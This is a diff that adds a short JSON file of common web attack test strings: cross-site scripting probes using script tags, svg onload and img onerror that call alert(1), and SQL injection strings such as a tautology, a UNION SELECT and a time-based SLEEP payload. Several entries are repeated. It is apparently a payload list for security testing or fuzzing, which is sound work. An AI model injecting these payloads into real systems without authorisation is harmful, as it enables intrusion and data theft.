@@ -1,0 +1,16 @@
+{
+  "xss": [
+    "<script>alert(1)</script>",
+    "<svg/onload=alert(1)>",
+    "<img src=x onerror=alert(1)>",
+    "<script>alert(1)</script>",
+    "<script>alert(1)</script>",
+    "<svg/onload=alert(1)>"
+  ],
+  "sqli": [
+    "' OR '1'='1",
+    "' UNION SELECT 1,2,3--",
+    "' OR SLEEP(5)--",
+    "' OR '1'='1"
+  ]
+}
